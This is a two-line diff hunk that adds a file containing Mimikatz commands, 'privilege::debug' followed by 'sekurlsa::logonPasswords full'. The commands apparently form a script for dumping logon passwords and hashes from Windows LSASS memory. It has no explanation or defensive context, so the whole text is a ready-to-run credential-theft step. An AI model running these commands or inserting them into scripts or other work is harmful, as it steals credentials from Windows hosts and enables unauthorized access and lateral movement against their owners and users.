@@ -1,0 +1,2 @@
+privilege::debug
+sekurlsa::logonPasswords full
